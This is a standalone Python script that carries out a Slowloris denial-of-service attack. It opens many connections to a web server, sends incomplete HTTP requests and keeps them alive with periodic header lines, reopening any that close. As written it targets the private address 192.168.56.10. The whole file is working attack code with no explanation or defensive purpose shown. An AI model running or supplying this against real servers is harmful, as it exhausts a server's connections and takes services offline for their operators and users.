import socket
import time
import random

def slowloris(target_host, target_port=80, num_sockets=50):
    print(f"[+] Starting Slowloris attack on {target_host}:{target_port}")
    sockets = []

    for _ in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_host, target_port))
            s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {target_host}\r\n".encode("utf-8"))
            sockets.append(s)
        except socket.error:
            break

    while True:
        for s in sockets:
            try:
                s.send("X-a: keep-alive\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(4)
                    new_sock.connect((target_host, target_port))
                    new_sock.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode("utf-8"))
                    new_sock.send(f"Host: {target_host}\r\n".encode("utf-8"))
                    sockets.append(new_sock)
                except:
                    continue
        time.sleep(15)

if __name__ == "__main__":
    slowloris("192.168.56.10", 80)  
